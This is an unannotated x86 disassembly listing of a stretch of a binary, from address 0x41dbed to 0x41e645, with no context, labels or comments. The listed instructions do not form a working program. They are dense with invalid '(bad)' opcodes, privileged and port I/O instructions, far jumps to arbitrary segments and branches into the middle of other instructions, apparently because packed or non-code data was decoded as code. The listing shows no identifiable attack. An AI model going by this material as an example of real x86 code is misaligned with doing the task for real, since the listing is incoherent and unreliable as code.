  41dbed:	jnp    0x41dc18
  41dbef:	xor    al,BYTE PTR [eax+0x2f]
  41dbf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbf3:	adc    BYTE PTR [ebx-0x384edc52],ch
  41dbf9:	loope  0x41dc36
  41dbfb:	jnp    0x41db9d
  41dbfd:	add    ebp,DWORD PTR [ebp+0x4b]
  41dc00:	ret    0x1e6
  41dc03:	cmp    al,0xa
  41dc05:	mov    bl,0xb2
  41dc07:	add    DWORD PTR [ecx],ebx
  41dc09:	lock test BYTE PTR ds:0xc58cf88,ch
  41dc10:	(bad)  
  41dc13:	dec    esi
  41dc14:	vpsraw xmm4,xmm0,xmm5
  41dc18:	dec    ecx
  41dc19:	lahf   
  41dc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc1b:	jle    0x41dc7e
  41dc1d:	add    bh,ah
  41dc1f:	idiv   DWORD PTR [eax]
  41dc21:	cmp    eax,ebx
  41dc23:	addr16 stc 
  41dc25:	jo     0x41dc8f
  41dc27:	fsubrp st(3),st
  41dc29:	push   ss
  41dc2a:	rcr    DWORD PTR [ebx+0x60],1
  41dc2d:	inc    eax
  41dc2e:	add    BYTE PTR [esi+0x4],al
  41dc31:	jecxz  0x41dc9b
  41dc33:	push   cs
  41dc34:	cmp    BYTE PTR [ebx+0x14],0xf8
  41dc38:	mov    esp,DWORD PTR [eax+0x5]
  41dc3b:	mov    cs,WORD PTR [eax-0x23]
  41dc3e:	(bad)  
  41dc40:	add    DWORD PTR [eax],0x0
	...
  41dcb3:	add    BYTE PTR [eax-0x67],ah
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x80
  41dcc1:	xchg   esp,eax
  41dcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc3:	mov    ah,0x77
  41dcc5:	inc    eax
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	cmc    
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	add    BYTE PTR [eax-0x51],bl
  41dcce:	jo     0x41dca2
  41dcd0:	push   ss
  41dcd1:	test   BYTE PTR [ebx],0xab
  41dcd4:	les    ebx,FWORD PTR [eax-0x60df4671]
  41dcda:	jmp    0x39dc3b70
  41dcdf:	mov    bl,BYTE PTR [ebx]
  41dce1:	bound  edx,QWORD PTR [eax-0x69]
  41dce4:	std    
  41dce5:	ds jae 0x41dc86
  41dce8:	loope  0x41dd5d
  41dcea:	mov    edi,0x47c7252a
  41dcef:	ja     0x41dd4d
  41dcf1:	shr    dl,0x58
  41dcf4:	out    0x51,eax
  41dcf6:	sub    al,BYTE PTR [ebp-0x4d]
  41dcf9:	xchg   edi,eax
  41dcfa:	jno    0x41dcca
  41dcfc:	imul   eax,ebx,0xcd82ba43
  41dd02:	cld    
  41dd03:	jo     0x41dd5b
  41dd05:	or     DWORD PTR [ebx],eax
  41dd07:	imul   eax,DWORD PTR [esi],0x71a26529
  41dd0d:	or     ebx,DWORD PTR [ecx-0x1d49dff7]
  41dd13:	xor    bl,cl
  41dd15:	outs   dx,BYTE PTR ds:[esi]
  41dd16:	push   ds
  41dd17:	xchg   ecx,eax
  41dd18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd19:	mov    WORD PTR [edx+ecx*1],es
  41dd1c:	sbb    al,0x7a
  41dd1e:	mov    cl,0x9e
  41dd20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd21:	adc    eax,0xa0769681
  41dd26:	mov    al,BYTE PTR [ebx+0x2a]
  41dd29:	jg     0x41dce5
  41dd2b:	aam    0x21
  41dd2d:	and    ah,BYTE PTR [edi+0x4043d210]
  41dd33:	and    DWORD PTR [ecx-0x1f],0xffffffc8
  41dd37:	aaa    
  41dd38:	cmp    eax,DWORD PTR [eax-0x5c1e821c]
  41dd3e:	cmp    eax,0xb72e3022
  41dd43:	and    eax,DWORD PTR [eax-0x39e0eadb]
  41dd49:	sti    
  41dd4a:	dec    eax
  41dd4b:	ds cli 
  41dd4d:	push   0x64fc5199
  41dd52:	cli    
  41dd53:	gs push ebp
  41dd55:	xlat   BYTE PTR ds:[ebx]
  41dd56:	jmp    0xc3e3:0x766a7a3f
  41dd5d:	mov    ebp,0xb7bbcf44
  41dd62:	push   ds
  41dd63:	call   0xcc89:0xa4a70b19
  41dd6a:	dec    edx
  41dd6b:	adc    dh,cl
  41dd6d:	push   0x2a37db49
  41dd72:	pusha  
  41dd73:	push   0xd5167e69
  41dd78:	sbb    edx,DWORD PTR [esi+0x7ac0c9bf]
  41dd7e:	jo     0x41dd98
  41dd80:	jb     0x41ddcd
  41dd82:	lods   eax,DWORD PTR ds:[esi]
  41dd83:	fnstcw WORD PTR [edx-0x26]
  41dd86:	sti    
  41dd87:	adc    eax,DWORD PTR [esi]
  41dd89:	or     al,BYTE PTR [edi-0x62]
  41dd8c:	xchg   dh,bh
  41dd8e:	mov    edx,0x7c2b8a2c
  41dd93:	xor    BYTE PTR [esi-0x59],bl
  41dd96:	cmp    BYTE PTR [edi-0x11805bde],al
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	jge    0x41dd53
  41dd9f:	in     al,dx
  41dda0:	in     eax,dx
  41dda1:	adc    eax,0x91c187d7
  41dda6:	dec    edi
  41dda7:	xor    esp,esp
  41dda9:	pushf  
  41ddaa:	sbb    ecx,esp
  41ddac:	add    eax,0xa9d479d0
  41ddb1:	fcmovb st,st(2)
  41ddb3:	js     0x41de1e
  41ddb5:	std    
  41ddb6:	leave  
  41ddb7:	lods   eax,DWORD PTR ds:[esi]
  41ddb8:	cli    
  41ddb9:	mov    cl,0x39
  41ddbb:	stos   BYTE PTR es:[edi],al
  41ddbc:	lahf   
  41ddbd:	lahf   
  41ddbe:	xchg   esi,eax
  41ddbf:	in     eax,0x4d
	...
  41de31:	add    BYTE PTR [eax],al
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	loopne 0x41dde1
  41de42:	cmp    cl,0x6c
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	cmc    
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    BYTE PTR [eax+0x3bc39eb4],bh
  41de51:	test   al,0x3c
  41de53:	cdq    
  41de54:	pusha  
  41de55:	pcmpgtd mm1,QWORD PTR [edx]
  41de58:	inc    esp
  41de59:	xchg   esi,eax
  41de5a:	or     BYTE PTR [ecx-0x2fb755c6],ah
  41de60:	fadd   st(7),st
  41de62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de63:	(bad)  
  41de64:	fcom   QWORD PTR ss:[esi+0x42]
  41de68:	xor    cl,BYTE PTR [eax-0x7e]
  41de6b:	imul   ebp,edx,0xffffffce
  41de6e:	std    
  41de6f:	jecxz  0x41de2e
  41de71:	pop    edx
  41de72:	nop
  41de73:	ja     0x41ddf6
  41de75:	mov    ecx,0xda5356d6
  41de7a:	sti    
  41de7b:	mov    edx,0xfb685b81
  41de80:	jle    0x41deba
  41de82:	lahf   
  41de83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de84:	call   0xd9d87dfe
  41de89:	add    ebx,DWORD PTR [ecx]
  41de8b:	lahf   
  41de8c:	push   eax
  41de8d:	inc    ebx
  41de8e:	cld    
  41de8f:	lock lea ebx,[ebp+0x5a7b8634]
  41de96:	in     al,0xab
  41de98:	mov    WORD PTR ds:0xe7860612,es
  41de9e:	aaa    
  41de9f:	arpl   WORD PTR [eax+0x5abc691],ax
  41dea5:	dec    edi
  41dea6:	lods   eax,DWORD PTR ds:[esi]
  41dea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dea8:	enter  0x31ea,0xed
  41deac:	sub    eax,0x5873faae
  41deb1:	push   ds
  41deb2:	cdq    
  41deb3:	mov    cl,0x57
  41deb5:	sbb    BYTE PTR [ebp+0x1c],ah
  41deb8:	ins    DWORD PTR es:[edi],dx
  41deb9:	dec    esp
  41deba:	imul   DWORD PTR [esi+0x18fca395]
  41dec0:	addr16 jge 0x41de6f
  41dec3:	cdq    
  41dec4:	mov    esi,0xa8534920
  41dec9:	ret    
  41deca:	sub    BYTE PTR [ebp-0xf],dl
  41decd:	sub    BYTE PTR [edx+edi*8-0x445e2e91],0x17
  41ded5:	pop    ebp
  41ded6:	jmp    DWORD PTR [edi]
  41ded8:	inc    edi
  41ded9:	cmp    BYTE PTR [eax],dl
  41dedb:	in     al,0x77
  41dedd:	xlat   BYTE PTR ds:[ebx]
  41dede:	jge    0x41df3c
  41dee0:	arpl   WORD PTR [ebp+0x31],si
  41dee3:	jle    0x41df46
  41dee5:	gs mov edi,ecx
  41dee8:	fistp  WORD PTR [eax+0x58]
  41deeb:	pop    es
  41deec:	jmp    0x5242f22
  41def1:	aad    0x35
  41def3:	push   cs
  41def4:	daa    
  41def5:	hlt    
  41def6:	fistp  WORD PTR [eax+0x2f5cc423]
  41defc:	push   0x32
  41defe:	cmp    eax,0xd179c173
  41df03:	inc    esi
  41df04:	out    0xb8,al
  41df06:	mov    dh,0x61
  41df08:	adc    eax,0xecd3e66b
  41df0d:	jg     0x41df6e
  41df0f:	fxch   st(6)
  41df11:	sbb    eax,0x9721c196
  41df16:	dec    ebp
  41df17:	inc    eax
  41df18:	add    eax,ebx
  41df1a:	scas   al,BYTE PTR es:[edi]
  41df1b:	jmp    0xb979:0x4a53d04
  41df22:	add    esi,ecx
  41df24:	mov    eax,ds:0x9701d01f
  41df29:	es or  eax,0xc1086c84
  41df2f:	mov    BYTE PTR [edi+0x21],dl
  41df32:	push   ss
  41df33:	std    
  41df34:	test   BYTE PTR [eax],0xe
  41df37:	aas    
  41df38:	ror    DWORD PTR [ebx],cl
  41df3a:	xor    DWORD PTR [eax],esi
  41df3c:	shr    BYTE PTR [ecx+0x55],1
  41df3f:	ja     0x41df0d
	...
  41dfb1:	add    BYTE PTR [eax],al
  41dfb3:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	pop    ds
  41dfc1:	out    dx,al
  41dfc2:	xchg   esp,eax
  41dfc3:	je     0x41e026
  41dfc5:	inc    edx
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [ebp-0x2055fd8a],dh
  41dfd1:	push   ss
  41dfd2:	arpl   WORD PTR [ebx],sp
  41dfd4:	xchg   ecx,eax
  41dfd5:	lods   al,BYTE PTR ds:[esi]
  41dfd6:	sbb    edx,0xffffffd9
  41dfd9:	mov    eax,0x21da078f
  41dfde:	mov    ah,cl
  41dfe0:	stos   BYTE PTR es:[edi],al
  41dfe1:	in     al,dx
  41dfe2:	mov    esi,0x8091c93c
  41dfe7:	addr16 push cs
  41dfe9:	jge    0x41dff9
  41dfeb:	or     DWORD PTR [ebx-0x55],esp
  41dfee:	jl     0x41dfe9
  41dff0:	dec    edi
  41dff1:	neg    BYTE PTR [ebx-0x1d]
  41dff4:	bound  edx,QWORD PTR ds:0x2a93a593
  41dffa:	shr    DWORD PTR [ebx],cl
  41dffc:	idiv   DWORD PTR [ebx+0x678e8368]
  41e002:	pop    esi
  41e003:	or     eax,0x8f34f930
  41e008:	dec    ecx
  41e009:	mov    ebx,0xf1deda2b
  41e00e:	and    BYTE PTR ds:0xef0bd0d9,ah
  41e014:	jge    0x41e07d
  41e016:	popa   
  41e017:	add    al,bl
  41e019:	rol    DWORD PTR [edi-0x50181153],1
  41e01f:	push   esp
  41e020:	je     0x41e079
  41e022:	xchg   esp,eax
  41e023:	int3   
  41e024:	popa   
  41e025:	(bad)  
  41e026:	xchg   ecx,eax
  41e027:	cmp    bh,BYTE PTR [esi]
  41e029:	or     BYTE PTR [eax+edx*2-0x4d127202],ah
  41e030:	pop    ss
  41e031:	sbb    DWORD PTR [edx],ebp
  41e033:	leave  
  41e034:	inc    ebp
  41e035:	pop    eax
  41e036:	sub    dh,BYTE PTR [edi]
  41e038:	mov    esi,0xc46d3a00
  41e03d:	mov    esi,0x9be6e52c
  41e042:	paddq  mm5,QWORD PTR [ebx]
  41e045:	add    DWORD PTR [esi+0x262655ca],esp
  41e04b:	sti    
  41e04c:	push   esi
  41e04d:	dec    ebp
  41e04e:	das    
  41e04f:	sub    eax,0x3bb50edf
  41e054:	ja     0x41e0ae
  41e056:	xchg   esp,eax
  41e057:	or     eax,0x568cf231
  41e05c:	mov    BYTE PTR [eax+0x3fa0dec1],ah
  41e062:	repnz push cx
  41e065:	jl     0x41e055
  41e067:	loop   0x41dfef
  41e069:	jne    0x41e092
  41e06b:	enter  0xa83a,0x9c
  41e06f:	fs aas 
  41e071:	xor    BYTE PTR [ecx],al
  41e073:	mov    eax,ds:0x9aa6580f
  41e078:	pop    es
  41e079:	jbe    0x41e0a7
  41e07b:	pop    edi
  41e07c:	sub    edi,eax
  41e07e:	lods   al,BYTE PTR ds:[esi]
  41e07f:	std    
  41e080:	leave  
  41e081:	dec    edi
  41e082:	imul   edi
  41e084:	xor    eax,0x86e30dd8
  41e089:	dec    eax
  41e08a:	sbb    al,0x95
  41e08c:	mov    eax,0x5ba7c7b9
  41e091:	cmp    ecx,0xf685d7ad
  41e097:	inc    esi
  41e098:	adc    cl,0xb4
  41e09b:	mov    al,ds:0xac603179
  41e0a0:	pushf  
  41e0a1:	adc    al,0xcc
  41e0a3:	mov    ds:0xb8d73e2c,al
  41e0a8:	mov    esi,DWORD PTR [edi-0x4f25db1a]
  41e0ae:	(bad)  
  41e0af:	stc    
  41e0b0:	jbe    0x41e070
  41e0b2:	jo     0x41e0a8
  41e0b4:	or     DWORD PTR [esi+ebp*8-0x71],edi
  41e0b8:	je     0x41e0c1
  41e0ba:	or     al,0x1
  41e0bc:	gs inc ebx
  41e0be:	pop    es
  41e0bf:	adc    al,0xd2
	...
  41e131:	add    BYTE PTR [eax],al
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	in     eax,0xba
  41e142:	mul    BYTE PTR [edx]
  41e144:	push   esi
  41e145:	inc    ebx
  41e146:	add    DWORD PTR [eax],eax
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    cl,ch
  41e14d:	mov    BYTE PTR [esi+0xcc246fa],bl
  41e153:	push   ebx
  41e154:	mov    ecx,0x9df5b01e
  41e159:	jl     0x41e12f
  41e15b:	pop    edi
  41e15c:	das    
  41e15d:	dec    edi
  41e15e:	retf   0x3337
  41e161:	or     BYTE PTR [ebx+0x3],al
  41e164:	adc    al,0x14
  41e166:	mov    dl,0x33
  41e168:	add    ah,ah
  41e16a:	or     al,0x78
  41e16c:	inc    ecx
  41e16d:	arpl   sp,cx
  41e16f:	mov    WORD PTR [eax],gs
  41e171:	(bad)  [edi-0x3b]
  41e174:	dec    esp
  41e175:	or     eax,0x80b2204
  41e17a:	sbb    cl,BYTE PTR [edx-0x20]
  41e17d:	jbe    0x41e1b1
  41e17f:	loope  0x41e13f
  41e181:	mov    edx,0x7d40c849
  41e186:	push   edx
  41e187:	mov    ebp,0x48a1ff98
  41e18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18d:	lods   al,BYTE PTR ds:[esi]
  41e18e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18f:	lock in al,dx
  41e191:	retf   
  41e192:	xor    BYTE PTR [edx-0x7d3aa2e6],0x4a
  41e199:	icebp  
  41e19a:	mov    edx,0x34eac664
  41e19f:	push   ebx
  41e1a0:	jmp    0x65c8:0xbd3dc32d
  41e1a7:	test   BYTE PTR [esi+0x69a36fed],bh
  41e1ad:	cmp    BYTE PTR [ebp+0x4e177641],bh
  41e1b3:	push   ds
  41e1b4:	mov    esi,0xb99cca73
  41e1b9:	stos   BYTE PTR es:[edi],al
  41e1ba:	jmp    0x41e17b
  41e1bc:	mov    al,0xd2
  41e1be:	cwde   
  41e1bf:	jmp    0x41e230
  41e1c1:	push   0xffffffd0
  41e1c3:	cmp    eax,esp
  41e1c5:	ds shl cl,0x58
  41e1c9:	dec    edi
  41e1ca:	jl     0x41e20e
  41e1cc:	ds mov edi,0x26f3189a
  41e1d2:	dec    ebp
  41e1d3:	sti    
  41e1d4:	xchg   edi,eax
  41e1d5:	inc    ebp
  41e1d6:	imul   esp,DWORD PTR [esi-0x35],0xffffffaa
  41e1da:	lahf   
  41e1db:	ret    0x169
  41e1de:	add    DWORD PTR [edx-0x6d],0x31
  41e1e2:	icebp  
  41e1e3:	mov    esi,0x7eadfcfa
  41e1e8:	leave  
  41e1e9:	(bad)  
  41e1ea:	xchg   WORD PTR [edi],si
  41e1ed:	sti    
  41e1ee:	ja     0x41e1d4
  41e1f0:	pop    edi
  41e1f1:	lds    ebx,FWORD PTR [edx-0x5a]
  41e1f4:	loope  0x41e218
  41e1f6:	out    dx,eax
  41e1f7:	mov    ds:0xaa8b40cc,al
  41e1fc:	sti    
  41e1fd:	fs inc esp
  41e1ff:	sub    DWORD PTR [edi],0x95abe60a
  41e205:	or     dh,ch
  41e207:	xor    edx,DWORD PTR [edi+0x71]
  41e20a:	jl     0x41e1ac
  41e20c:	xchg   ebx,eax
  41e20d:	push   0xf818f37b
  41e212:	lods   eax,DWORD PTR ds:[esi]
  41e213:	mov    bh,0x5c
  41e215:	mov    edx,0x56e512a6
  41e21a:	jmp    0x41e27a
  41e21c:	push   cs
  41e21d:	into   
  41e21e:	call   0x1abc:0xf482fbff
  41e225:	push   ebp
  41e226:	dec    ah
  41e228:	sbb    esi,DWORD PTR [edi-0x1e30ae42]
  41e22e:	push   ebp
  41e22f:	push   esp
  41e230:	fwait
  41e231:	in     al,0x93
  41e233:	and    dh,BYTE PTR [ebp-0x79]
  41e236:	and    BYTE PTR [ebp+eax*2-0x34],0xea
  41e23b:	jmp    0x41e279
  41e23d:	clc    
  41e23e:	pop    es
  41e23f:	cmp    BYTE PTR [ecx+0x0],bh
	...
  41e2b1:	add    BYTE PTR [eax],al
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx+0x50],di
  41e2c1:	mov    ecx,0x444b05a9
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	cmc    
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [ecx-0x2b],dl
  41e2ce:	ins    DWORD PTR es:[edi],dx
  41e2cf:	aas    
  41e2d0:	cwde   
  41e2d1:	fsub   st(0),st
  41e2d3:	sbb    cl,BYTE PTR [ecx+0x670fd1d5]
  41e2d9:	mov    al,0x22
  41e2db:	das    
  41e2dc:	mov    edi,0xb7f552fd
  41e2e1:	sub    eax,0x4cf5e6a2
  41e2e6:	inc    eax
  41e2e7:	xor    al,0x8d
  41e2e9:	adc    bl,BYTE PTR [ebp+0xd288476]
  41e2ef:	pop    edx
  41e2f0:	(bad)  
  41e2f1:	xor    eax,0xd5491aef
  41e2f6:	dec    ecx
  41e2f7:	mov    edi,0x75b8d4fc
  41e2fc:	dec    edx
  41e2fd:	leave  
  41e2fe:	out    0x35,al
  41e300:	pop    ebp
  41e301:	repnz sbb eax,0x4775d0c0
  41e307:	into   
  41e308:	mov    cl,0x60
  41e30a:	sbb    ch,BYTE PTR [eax+0x2f]
  41e30d:	xor    BYTE PTR gs:[edx+0x65],bl
  41e311:	pop    esi
  41e312:	or     ecx,DWORD PTR [edi]
  41e314:	loopne 0x41e31b
  41e316:	xchg   edx,eax
  41e317:	xchg   BYTE PTR [edx+esi*2-0x59],ch
  41e31b:	test   BYTE PTR [edx-0x2c51c07d],cl
  41e321:	pop    ecx
  41e322:	push   0x677bf5af
  41e327:	loope  0x41e389
  41e329:	in     al,dx
  41e32a:	push   es
  41e32b:	sbb    eax,0xf55f013
  41e330:	pop    ebx
  41e331:	inc    ebx
  41e332:	pop    edi
  41e333:	bswap  edx
  41e335:	push   esp
  41e336:	inc    ebx
  41e337:	das    
  41e338:	mov    esi,0x1b91b366
  41e33d:	cmp    bl,cl
  41e33f:	xchg   ebp,eax
  41e340:	jg     0x41e2c5
  41e342:	(bad)  
  41e343:	ret    0x8165
  41e346:	rcr    al,1
  41e348:	push   ss
  41e349:	mov    cl,0xa2
  41e34b:	sbb    DWORD PTR [esi+eax*8+0x65],ebx
  41e34f:	xor    dl,bl
  41e351:	sub    al,0x9f
  41e353:	rcr    BYTE PTR [edx-0x49ac2dc1],cl
  41e359:	push   edx
  41e35a:	aad    0x36
  41e35c:	call   0x2284866
  41e361:	dec    esi
  41e362:	icebp  
  41e363:	out    dx,eax
  41e364:	sub    al,0xe0
  41e366:	scas   eax,DWORD PTR es:[edi]
  41e367:	xor    dh,al
  41e369:	mov    ecx,DWORD PTR [eax+0x7e]
  41e36c:	inc    ebx
  41e36d:	xchg   ebp,eax
  41e36e:	xchg   ebx,eax
  41e36f:	fst    QWORD PTR fs:[ebp+0x7a5ac5d1]
  41e376:	sbb    DWORD PTR [eax+eiz*4-0x6c],edi
  41e37a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e37b:	(bad)  
  41e37c:	mov    al,0xd4
  41e37e:	mov    ebx,0xa118b211
  41e383:	mov    gs,esi
  41e385:	(bad)  
  41e386:	fist   DWORD PTR [ebx-0x7ed582a]
  41e38c:	sub    dl,0x9a
  41e38f:	pop    ss
  41e390:	aas    
  41e391:	les    eax,FWORD PTR [ebp-0x7e5f2cdf]
  41e397:	outs   dx,DWORD PTR ds:[esi]
  41e398:	das    
  41e399:	sti    
  41e39a:	push   cs
  41e39b:	(bad)  
  41e39c:	or     DWORD PTR [ebx],eax
  41e39e:	push   edx
  41e39f:	xchg   ebx,esp
  41e3a1:	mov    edx,0xd1d5464
  41e3a6:	std    
  41e3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3a8:	jnp    0x41e37f
  41e3aa:	sbb    al,0x81
  41e3ac:	ins    DWORD PTR es:[edi],dx
  41e3ad:	hlt    
  41e3ae:	cmc    
  41e3af:	js     0x41e37e
  41e3b1:	add    bh,bl
  41e3b3:	push   es
  41e3b4:	das    
  41e3b5:	aaa    
  41e3b6:	into   
  41e3b7:	addr16 lock es mov esi,0xaf458d73
  41e3bf:	mov    dl,0xd4
	...
  41e431:	add    BYTE PTR [eax],al
  41e433:	add    dh,dh
  41e435:	rcl    BYTE PTR ss:[edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0xd525fead,al
  41e442:	shr    DWORD PTR [eax+0x40],0x45
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    cl,ah
  41e44d:	add    BYTE PTR [ebp+0x1d],dl
  41e450:	xchg   ecx,eax
  41e451:	cs cwde 
  41e453:	test   DWORD PTR [eax],ebp
  41e455:	sub    eax,0x1440dd05
  41e45a:	dec    DWORD PTR [ebp-0x460fcaa5]
  41e460:	xchg   ecx,eax
  41e461:	into   
  41e462:	out    dx,eax
  41e463:	adc    BYTE PTR [ebx],0xf0
  41e466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e467:	not    BYTE PTR [ecx+ebx*1+0x24]
  41e46b:	stos   DWORD PTR es:[edi],eax
  41e46c:	dec    edx
  41e46d:	pop    esp
  41e46e:	(bad)  
  41e470:	loop   0x41e4cc
  41e472:	arpl   WORD PTR [eax+0x650c3b8f],ax
  41e478:	in     al,0xb2
  41e47a:	pushf  
  41e47b:	ficomp WORD PTR [edi+0x533a1820]
  41e481:	repz sbb cl,0x36
  41e485:	adc    al,0x89
  41e487:	fdiv   st(3),st
  41e489:	std    
  41e48a:	jb     0x41e40c
  41e48c:	adc    BYTE PTR [esi-0x56],dl
  41e48f:	xchg   ecx,eax
  41e490:	jne    0x41e4d2
  41e492:	shrd   edx,eax,0x8f
  41e496:	mov    ah,0x9e
  41e498:	dec    esi
  41e499:	dec    edi
  41e49a:	pop    ebp
  41e49b:	les    esi,FWORD PTR [ebp+0x4dd1f064]
  41e4a1:	cmp    bh,BYTE PTR [edx-0x12]
  41e4a4:	popa   
  41e4a5:	mov    eax,ds:0x54f77ad9
  41e4aa:	(bad)  
  41e4ab:	into   
  41e4ac:	dec    edx
  41e4ad:	fs jle 0x41e501
  41e4b0:	sbb    al,0x40
  41e4b2:	call   0xd996:0x836cdf7f
  41e4b9:	jmp    0x41e483
  41e4bb:	fnstcw WORD PTR [eax+0x5]
  41e4be:	mov    bh,0x20
  41e4c0:	mov    ah,al
  41e4c2:	les    ecx,FWORD PTR [edi-0x6]
  41e4c5:	mov    eax,0xea6b33f1
  41e4ca:	mov    ah,0x57
  41e4cc:	lahf   
  41e4cd:	cmp    ch,BYTE PTR [eax-0xc]
  41e4d0:	adc    BYTE PTR [eax],bl
  41e4d2:	sub    BYTE PTR [ecx+ebp*8],bl
  41e4d5:	iret   
  41e4d6:	xor    DWORD PTR [ebx-0x4e],esp
  41e4d9:	jno    0x41e510
  41e4db:	push   cs
  41e4dc:	pushf  
  41e4dd:	aas    
  41e4de:	not    BYTE PTR [ecx+0x57]
  41e4e1:	repnz retf 0x8d39
  41e4e5:	mov    bh,0xca
  41e4e7:	sub    eax,0xd156ec58
  41e4ec:	mov    al,dl
  41e4ee:	retf   
  41e4ef:	outs   dx,DWORD PTR ds:[esi]
  41e4f0:	aam    0x56
  41e4f2:	add    DWORD PTR [esi+0x7f],0x536c1460
  41e4f9:	push   esi
  41e4fa:	cmp    cl,BYTE PTR [edi+0x7351c9bb]
  41e500:	arpl   WORD PTR [ebp+0x2f],di
  41e503:	adc    bl,bh
  41e505:	mov    dl,0x34
  41e507:	sbb    DWORD PTR [esp+ebx*8-0xe],ecx
  41e50b:	loopne 0x41e51e
  41e50d:	leave  
  41e50e:	jp     0x41e55a
  41e510:	clc    
  41e511:	ret    0xdea4
  41e514:	scas   eax,DWORD PTR es:[edi]
  41e515:	sub    al,dl
  41e517:	pop    ss
  41e518:	mov    bh,0x6a
  41e51a:	jecxz  0x41e558
  41e51c:	dec    eax
  41e51d:	dec    esp
  41e51e:	enter  0xa44b,0xde
  41e522:	jmp    0x218f:0x806e326e
  41e529:	call   0xaa817f5
  41e52e:	cmp    esp,DWORD PTR [edi]
  41e530:	aad    0xaa
  41e532:	pop    esp
  41e533:	pusha  
  41e534:	shl    BYTE PTR cs:[edx+0x20],1
  41e538:	lahf   
  41e539:	push   esp
  41e53a:	daa    
  41e53b:	xor    al,0x57
  41e53d:	mov    esi,0x7877ea
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz aam 0xb4
  41e5c2:	add    DWORD PTR [esi+0x35],edx
  41e5c5:	inc    esi
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	cmc    
  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	add    BYTE PTR [esi+eiz*2],cl
  41e5ce:	gs push ss
  41e5d0:	rcr    BYTE PTR [esi-0x39],1
  41e5d3:	add    al,0x25
  41e5d5:	jp     0x41e5b2
  41e5d7:	xchg   edi,eax
  41e5d8:	or     dh,BYTE PTR [esi-0x36]
  41e5db:	iret   
  41e5dc:	test   eax,0xa770e8b3
  41e5e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e2:	(bad)  
  41e5e3:	add    bl,BYTE PTR [bx+si+0x71]
  41e5e7:	inc    esp
  41e5e8:	sbb    esi,DWORD PTR [esi-0x21]
  41e5eb:	xchg   DWORD PTR [edi],esp
  41e5ed:	pop    esp
  41e5ee:	cmp    ebp,edi
  41e5f0:	xlat   BYTE PTR ds:[ebx]
  41e5f1:	jmp    0x582e859c
  41e5f6:	fcmove st,st(7)
  41e5f8:	push   eax
  41e5f9:	jmp    0x38d6:0x897eaadd
  41e600:	sub    bl,cl
  41e602:	int3   
  41e603:	gs (bad) 
  41e605:	xor    BYTE PTR [esi+0x196688ac],bl
  41e60b:	inc    esp
  41e60c:	jno    0x41e672
  41e60e:	and    bl,ch
  41e610:	inc    ecx
  41e611:	hlt    
  41e612:	test   al,0x33
  41e614:	ds repnz pop edi
  41e617:	loopne 0x41e653
  41e619:	stos   BYTE PTR es:[edi],al
  41e61a:	jnp    0x41e618
  41e61c:	sbb    eax,0x3d3fc361
  41e621:	dec    esp
  41e622:	and    al,0xef
  41e624:	leave  
  41e625:	cmp    bl,bl
  41e627:	add    al,0xdc
  41e629:	adc    eax,0x132ef5af
  41e62e:	xor    esp,ecx
  41e630:	push   edx
  41e631:	loop   0x41e60b
  41e633:	add    DWORD PTR [edi+0x70e477cc],edi
  41e639:	mov    edi,0x51a6deef
  41e63e:	push   ds
  41e63f:	retf   0x37b5
  41e642:	retf   0x59d3
  41e645:	ret    0x4d7d
